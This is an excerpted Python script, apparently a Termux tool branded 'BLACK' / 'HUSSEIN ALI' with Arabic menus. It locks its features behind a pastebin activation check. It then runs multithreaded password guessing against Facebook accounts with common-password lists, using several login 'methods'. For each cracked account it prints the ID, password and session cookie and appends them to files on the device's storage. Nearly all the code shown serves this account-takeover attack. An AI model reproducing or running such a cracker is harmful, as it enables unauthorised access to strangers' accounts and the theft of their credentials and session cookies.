...
def chk():
  ...
  id = "+"
  print("\x1b[37;1mانتضر ليتم تحقق من التفعيل : ")
  
  try:
    httpCaht = requests.get("https://pastebin.com/raw/zcN1A44z").text
    if id in httpCaht:
      ...
      print("\033[0;96mعزيزي الادات متفوعه اصبحت يرجأ تفعيل عبر المبرمج @NN4I3") 
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        os.system('espeak -a 300 " Welcome,   to,  The,   Menu"')
                        ...
                        if xd in ['1','01']:
                                ...
                                clear()
                                linex()
                                print('\x1b[1;93m 1. \x1b[1;92mMETHODE P-MOB \n \x1b[1;93m2. \x1b[1;92mMETHOD MBASIC \n\x1b[1;93m 3. \x1b[1;92mMETHODE D-MOB \n\x1b[1;93m 4. \x1b[1;92mMETHODE X-LINEX')
                                linex()
                                mthd=input('\x1b[1;97m Choose: ')
                                plist = []
                                clear()
                                linex()
                                print(' \033[0;1m[ \033[31;1m1 \033[0;1m] 𝐕𝐈𝐏 - باسورد عشوائي ')
                                print(' \033[0;1m[ \033[31;1m2 \033[0;1m] 𝐕𝐈𝐏 - باسورد يدوي')
                                ...
                                if ppp in ['1','01']:
                                        ...
                                        plist.append('1234567812345678')
                                        plist.append('١٢٣٤٥٦')
                                        plist.append('firstfirst123456')
                                        plist.append('firstfirst')
                                        plist.append('112233332211')
                                elif ppp in ['3','03']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;32m Termux Face tool provided by BLACK ")
                                        print("\033[1;34m معرفي @NN4I3 ")
                                        print("\033[1;34m channel @NN4I3 ")
                                        linex()
                                ...
                                os.system(f'https://t.me/C9_9D');menu()
                        elif xd in ['7','07']:
                                crack()
                        elif xd in ['8','08']:
                                os.system('https://t.me/C9_9D');menu()
                        elif xd in ['9','09']:
                                sep()  
                        elif xd in ['10','10']:
                                double()                              
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;36mHUSSEIN ALI\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;33m%s%%\033[1;37m]\033[1;34m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\33[1;92m[BLACK-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                os.system('espeak -a 300 " BLACK,  OK,    ,ID   PASSWORD"')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/BLACK-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/BLACKOK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\33[1;93m[BLACK-CP] '+ids+' | '+pas+'\33[0;97m')
...
def api(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        ASX=str(session.cookies)
                        if "c_user" in ASX:
                                print('\33[1;92m[BLACKI-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                os.system('espeak -a 300 " BLACK  OK,    ,ID   PASSWORD"')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/BLACK-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/BLACK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
...
def api1(ids,names,passlist):
    ...
    'viewport-width': '980',
                        ...
                        if "c_user" in ASX:
                                print('\33[1;92m[BLACK-OK] '+ids+' | '+pas+'\33[0;97m')
                                print("\033[1;92m[•] Cookie: "+coki)
                                os.system('espeak -a 300 " HUSSEIN ALI,  OK,    ,ID   PASSWORD"')
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/BLACK-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/BLACK-OK.txt', 'a').write(ids+'|'+pas+'\n')
...
def rndm(ids,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;36HUSSEIN ALI\033[1;37m] \033[1;37m[\033[1;31m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;33m%s%%\033[1;37m]\033[1;34m'%(loop,len(oks),p));sys.stdout.flush()
        sys.stdout.flush()
        try:
                for pas in passlist:
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BLACK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        os.system('espeak -a 300 " HUSSEIN ALI,  OK,    ,ID   PASSWORD"')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/BLACKI-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/BLACK_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [BLACKCP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BLACK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
